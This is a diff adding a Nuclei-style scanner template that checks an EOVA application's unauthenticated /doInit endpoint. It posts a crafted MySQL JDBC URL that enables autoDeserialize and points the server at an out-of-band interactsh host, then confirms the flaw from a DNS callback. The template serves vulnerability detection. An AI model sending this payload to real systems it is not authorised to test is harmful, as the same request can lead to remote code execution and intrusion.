@@ -1,0 +1,22 @@
+id: poc-yaml-eova-doinit-jdbc-rce
+info:
+  name: EOVA Unauthorized doInit Endpoint Deserialization (RCE)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, sql-injection
+variables:
+  reverse: '{{interactsh-url}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/doInit'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      ip={{reverse}}:3333%2Ftest%3FautoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=URLDNS%26Yu9=Yu9%23&port=&username=root&password=123456
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - 'dns'
